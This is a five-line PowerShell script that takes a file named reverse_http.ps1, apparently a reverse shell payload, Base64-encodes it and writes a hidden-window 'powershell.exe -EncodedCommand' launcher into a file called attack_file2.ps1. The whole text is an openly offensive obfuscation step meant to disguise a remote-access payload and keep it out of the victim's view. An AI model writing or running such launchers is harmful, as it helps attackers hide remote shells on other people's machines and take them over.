$tar = "attack_file2.ps1"
$text = [IO.File]::ReadAllText(".\reverse_http.ps1")
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText = [Convert]::ToBase64String($Bytes)
"powershell.exe -WindowStyle Hidden -EncodedCommand $EncodedText" > ".\$tar"